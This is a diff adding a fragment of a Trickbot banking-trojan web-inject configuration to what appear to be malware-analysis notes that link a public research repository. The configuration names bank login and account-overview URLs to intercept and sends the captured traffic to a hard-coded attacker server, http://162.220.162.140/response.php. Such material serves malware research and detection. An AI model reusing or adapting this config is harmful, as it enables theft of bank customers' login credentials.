@@ -1,5 +1,40 @@
    Trickbot_configs + DLL Files
-
+   
+   
+      <igroup>
+      <dinj>
+      <lm>*/Authentication/Login*</lm>
+      <hl>http://162.220.162.140/response.php</hl>
+      <pri>100</pri>
+      <sq>2</sq>
+      </dinj>
+      <dinj>
+      <lm>*/Accounts/AccountOverview.asp*</lm>
+      <hl>http://162.220.162.140/response.php</hl>
+      <pri>100</pri>
+      <sq>2</sq>
+      </dinj>
+      </igroup>
+      <igroup>
+      <dinj>
+      <lm>*cey-ebanking.com/CLKCCM/*</lm>
+      <hl>http://162.220.162.140/response.php</hl>
+      <pri>100</pri>
+      <sq>2</sq>
+      <ignore_mask>*.gif*</ignore_mask>
+      <ignore_mask>*.jpg*</ignore_mask>
+      <ignore_mask>*.png*</ignore_mask>
+      <ignore_mask>*.js*</ignore_mask>
+      <ignore_mask>*.css*</ignore_mask>
+      <require_header>*text/html*</require_header>
+      </dinj>
+      </igroup>
+      <igroup>
+      <dinj>
+      <lm>*engine/login/businesslogin*</lm>
+      <hl>http://162.220.162.140/response.php</hl>
+      <pri>100</pri>
+      .....
 
    https://github.com/hasherezade/malware_analysis
 
